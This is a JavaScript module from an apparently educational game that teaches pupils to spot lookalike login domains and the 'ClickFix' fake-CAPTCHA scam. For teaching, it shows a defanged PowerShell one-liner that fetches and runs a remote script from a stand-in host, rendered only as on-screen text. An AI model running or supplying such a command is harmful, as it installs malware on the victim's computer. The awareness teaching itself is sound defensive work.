/* Fase 7 — 15:00 · Sites falsos (endereço x cadeado; página falsa que manda colar comando — "ClickFix") */
(function () {
  'use strict';
  const ico = (n) => ARTE.ico(n);

  // pre + dom (domínio que realmente manda) + pos
  const URLS = [
    { pre: 'accounts.', dom: 'google.com', pos: '/signin', v: true, ex: 'Domain <b>google.com</b>: the real one.' },
    { pre: 'accounts.google.com.', dom: 'secure-login.net', pos: '/signin', v: false, ex: 'The domain is <b>secure-login.net</b>. Everything to its left is decoration.' },
    { pre: '', dom: 'accounts-google.com', pos: '/signin', v: false, ex: 'A hyphen makes it a different domain: <b>accounts-google.com</b> is not google.com.' },
    { pre: 'accounts.', dom: 'googIe.com', pos: '/signin', v: false, ex: 'A capital <b>I</b> instead of a small <b>l</b>: googIe.com. In many fonts they look the same.' },
    { pre: 'stnicholas.', dom: 'managebac.com', pos: '/login', v: true, ex: 'Domain <b>managebac.com</b>, with the school\'s name in front: the real ManageBac.' },
    { pre: '', dom: 'stnicholas-managebac.com', pos: '/login', v: false, ex: 'The school\'s name stuck to "managebac" with a hyphen: <b>stnicholas-managebac.com</b> is someone else\'s site.' }
  ];
  // a ordem das opções muda a cada vez: a resposta certa não pode ser sempre a última
  function embaralhar(a) { const b = a.slice(); for (let i = b.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [b[i], b[j]] = [b[j], b[i]]; } return b; }

  M.registrar({
    ordem: 7, id: 'navegador', hora: '15:00', titulo: 'Browse safely', tema: 'Fake websites', icone: 'globo', max: 40,
    missao: 'Fake websites have a padlock too. First, <strong>sort the real addresses from the fake ones</strong>. Then open a link a classmate sent.',
    como: [
      ['lupa', 'Read the address from right to left, starting at the first "/".'],
      ['clique', 'Mark each address Real or Fake, then click Check.'],
      ['alerta', 'In the second part, decide what to do with the page.']
    ],
    licoes: [
      '<b>https</b> and the padlock only protect the connection. They do not prove the site is who it says it is.',
      'What counts is the <b>domain just before the first "/"</b>. Check it letter by letter: "1" and "l" look almost the same.',
      'No "are you human?" check ever asks you to press keys like <b>Windows + R</b> and paste something. That installs a virus: close the page and tell an adult.'
    ],
    conquista: { id: 'endereco', nome: 'Address checker', desc: 'Got all 6 addresses right and did not paste the command', icone: 'globo' },

    iniciar(api) {
      const marc = {};
      api.raiz.innerHTML = '<div class="f7"><div class="topo"><h3>Signing in to your school accounts</h3><p>Every address has a padlock. Which ones really are Google and ManageBac?</p></div>' +
        '<div class="urls">' + URLS.map((u, k) =>
          '<div class="url-linha" data-k="' + k + '" style="animation-delay:' + k * 0.08 + 's"><div class="barra-url">' + ico('cadeado') + '<span class="u"><span class="dim">https://</span>' + u.pre + '<mark>' + u.dom + '</mark>' + u.pos + '</span></div>' +
          '<div class="toggle"><button type="button" class="v" data-v="1">Real</button><button type="button" class="f" data-v="0">Fake</button></div>' +
          '<div class="expl"></div></div>').join('') + '</div>' +
        '<button class="btn conferir" type="button" disabled>' + ico('lupa') + 'Check</button></div>';
      const f7 = api.raiz.querySelector('.f7');
      const btn = f7.querySelector('.conferir');

      f7.querySelectorAll('.url-linha').forEach(l => {
        l.querySelectorAll('.toggle button').forEach(b => b.addEventListener('click', () => {
          if (btn.dataset.feito) return;
          api.som('clique');
          marc[l.dataset.k] = b.dataset.v === '1';
          l.querySelectorAll('.toggle button').forEach(x => x.classList.toggle('on', x === b));
          btn.disabled = Object.keys(marc).length < URLS.length;
        }));
      });

      btn.addEventListener('click', async () => {
        if (btn.dataset.feito) return;
        btn.dataset.feito = '1'; btn.disabled = true;
        const linhas = Array.from(f7.querySelectorAll('.url-linha'));
        for (let k = 0; k < URLS.length; k++) {
          const u = URLS[k], l = linhas[k], ok = marc[k] === u.v;
          l.classList.add('revelado'); if (!u.v) l.classList.add('falso');
          const e = l.querySelector('.expl');
          e.className = 'expl ' + (ok ? 'ok' : 'no');
          e.innerHTML = ico(ok ? 'check' : 'x') + '<span>' + (ok ? '' : '<b>' + (u.v ? 'It was real. ' : 'It was fake. ') + '</b>') + u.ex + '</span>';
          if (ok) api.acerto(5, l.querySelector('.toggle')); else api.erro(l.querySelector('.toggle'));
          api.registrar('url' + (k + 1), marc[k] ? 'verdadeiro' : 'falso', ok, 'https://' + u.pre + u.dom + u.pos);
          await api.espera(420);
        }
        btn.innerHTML = 'Continue' + ico('seta');
        btn.disabled = false;
        btn.onclick = () => { btn.onclick = null; api.som('clique'); parte2(); };
        btn.focus();
      });

      function parte2() {
        api.raiz.innerHTML = '<div class="f7"><div class="janela-nav"><div class="abas"><div class="aba"><i></i>Free skins for every game</div></div>' +
          '<div class="barra">' + ico('seta').replace('<svg ', '<svg width="16" height="16" style="transform:rotate(180deg);color:#5f6368" ') +
          '<div class="barra-url">' + ico('cadeado') + '<span class="u"><span class="dim">https://</span>free-skins-today.com/all-games</span></div></div>' +
          '<div class="pagina"><div class="captcha"><h4>Check that you are human</h4><p>Before you continue, we need to make sure you are not a robot.</p>' +
          '<div class="caixa-check" role="button" tabindex="0"><i></i>I am not a robot</div></div></div></div>' +
          '<div class="opcoes-nav"><div class="ctx"><b>15:05 · A link in the group chat</b>A classmate sent a site that gives out free game skins. Before the page opens, this check appears. <b style="display:inline;font-size:14.5px">Click the box</b> to carry on.</div><div class="opcoes"></div></div></div>';
        const f = api.raiz.querySelector('.f7');
        const chk = f.querySelector('.caixa-check');
        let clicou = false;
        const marcar = async () => {
          if (clicou) return; clicou = true;
          api.som('clique');
          chk.querySelector('i').classList.add('gira');
          await api.espera(1300);
          chk.querySelector('i').classList.remove('gira');
          chk.querySelector('i').innerHTML = ARTE.ico('alerta').replace('<svg ', '<svg width="20" height="20" style="color:#e9a21b" ');
          f.querySelector('.captcha').insertAdjacentHTML('beforeend', '<div class="passos"><b>Extra check needed</b><ol>' +
            '<li>Press <kbd>Windows</kbd> + <kbd>R</kbd></li><li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li><li>Press <kbd>Enter</kbd></li></ol></div>');
          api.som('notif');
          f.querySelector('.ctx').innerHTML = '<b>The check wants more.</b>Three key presses to "prove you are human". What do you do?';
          const ops = embaralhar([
            { t: 'Follow the 3 steps: it is only a check', ok: false, rodou: true },
            { t: 'Do only step 1, to see what happens', ok: false },
            { t: 'Close the page and tell an adult', ok: true },
            { t: 'Try the steps on a school computer instead, where it is safer', ok: false, rodou: true }
          ]);
          const box = f.querySelector('.opcoes');
          box.innerHTML = ops.map((o, k) => '<button class="opcao" type="button" style="animation-delay:' + k * 0.08 + 's"><span class="tecla">' + (k + 1) + '</span><span>' + o.t + '</span></button>').join('');
          const bts = Array.from(box.querySelectorAll('button'));
          const escolher = async k => {
            const o = ops[k];
            bts.forEach(b => { b.disabled = true; });
            api.teclas(null);
            api.registrar('clickfix', o.t, o.ok, 'Página pede Windows + R, Ctrl + V e Enter');
            if (o.ok) {
              api.acerto(10, bts[k]);
              await api.espera(500);
              f.querySelector('.janela-nav').style.cssText += ';transition:all .4s;opacity:0;transform:scale(.95)';
              await api.espera(400);
            } else {
              api.erro(bts[k]);
              f.querySelector('.pagina').insertAdjacentHTML('beforeend', '<div class="executar"><div class="tt">Run</div><div class="cp">' +
                (o.rodou ? 'Open:' : 'Type the name of a program... or paste:') + '<div class="campo">powershell -w hidden -c "iwr hxxps://cdn-verifica[.]top/c.ps1 | iex"</div>' +
                '<div style="color:#cf4a3c;margin-top:10px;font-weight:600">' + (o.rodou ? 'Done. A harmful program was downloaded and installed.' : 'The command is already copied. Ctrl + V and Enter would have finished the job.') + '</div></div></div>');
              await api.espera(1600);
            }
            await api.feedback({
              tipo: o.ok ? 'ok' : 'erro', titulo: o.ok ? 'Page closed, scam avoided!' : (o.rodou ? 'You installed the virus.' : 'That was close!'),
              texto: '<p>' + (o.ok ? 'No real website asks you to open Windows "Run" and paste something.' :
                'When you clicked the box, the page copied a command to your clipboard. The "steps" get you to open Run and start that command yourself.') + '</p>',
              caso: '<b>This trick has a name: ClickFix.</b> It works on any computer because nothing needs to be broken: the victim runs the command themselves. On a Mac it may ask you to open Terminal instead. Saw a request like this? Close the page, run nothing and tell an adult.',
              pts: o.ok ? '+10 pts' : '+0 pts', botao: 'See your result'
            });
            api.fim();
          };
          bts.forEach((b, k) => b.addEventListener('click', () => escolher(k)));
          api.teclas(e => { const k = parseInt(e.key, 10) - 1; if (k >= 0 && k < bts.length) escolher(k); });
        };
        chk.addEventListener('click', marcar);
        chk.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); marcar(); } });
        setTimeout(() => chk.focus(), 400);
      }
    }
  });
})();
